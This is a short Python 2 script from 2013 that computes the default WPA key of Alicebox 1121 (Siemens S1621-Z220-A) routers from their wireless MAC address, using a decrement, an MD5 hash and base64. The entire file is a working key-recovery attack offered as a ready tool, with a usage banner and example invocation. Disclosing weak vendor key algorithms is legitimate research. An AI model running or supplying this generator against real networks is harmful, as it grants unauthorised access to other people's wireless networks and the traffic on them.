#!/usr/bin/env python
# -*- coding: utf-8 -*-

# www.ednolo.alumnos.upv.es

'''
# Original Link : http://www.wardriving-forum.de/forum/f275/standard-wlanpassw%F6rter-von-alice-boxen-70287.html
# Alicebox 1121 - Siemens S1621-Z220-A

Changelog:
---------------.
2013/07/10 v0.1.0  + First commit
'''
import re
import sys
import base64
import hashlib

VERSION     = 0
SUBVERSION  = 1
RELEASE     = 0
DATEVERSION = '2013/07/10' 
URL         = 'http://www.ednolo.alumnos.upv.es'

def generateKey(mac_wlan,stdout="True"):
    
    mac_eth  = '%s%02x' %(mac_wlan[:10], int(mac_wlan[10:],16)-1) # eth_mac = wlan_mac - 1
    token    = hashlib.md5(mac_eth.lower()).hexdigest()[:12]
    
    if (stdout):
        print "[+] MAC ETH  : {0}".format(mac_eth)
        print "[+] MD5 snip : {0}".format(token)
        
    return  base64.b64encode(token)

def banner():
    print ' --------------------------------------------------------------------'
    print '|       Alicebox 1121 - Siemens  S1621-Z220-A           (GERMANY)    |'
    print '|--------------------------------------------------------------------|'
    print '|                 Default WPA Key Algorithm Weakness                 |'
    print '|               Eduardo Novella <@enovella_>                         |'
    print ' --------------------------------------------------------------------' 
    print '%s %d.%d.%d    %s    [%s]\n\n' %(sys.argv[0], VERSION, SUBVERSION,RELEASE,DATEVERSION,URL)      

def main():

    banner()   
    if len(sys.argv) != 2:
        print '\t usage: python %s [MAC] \n' %sys.argv[0]
        print '\t eg. python %s  00:25:5E:01:02:03'  %sys.argv[0]
        sys.exit()

    mac_wlan   = re.sub(r'[^a-fA-F0-9]', '', sys.argv[1])
    
    if len(mac_wlan) != 12:
        sys.exit('[!] Check MAC format!\n')
    
    print '[+] SSID     : Alicebox????'
    print '[+] MAC WLAN : %s ' % (mac_wlan)
    print '[+] WPA key  : %s'  % (generateKey(mac_wlan))

if __name__ == "__main__":
    main()
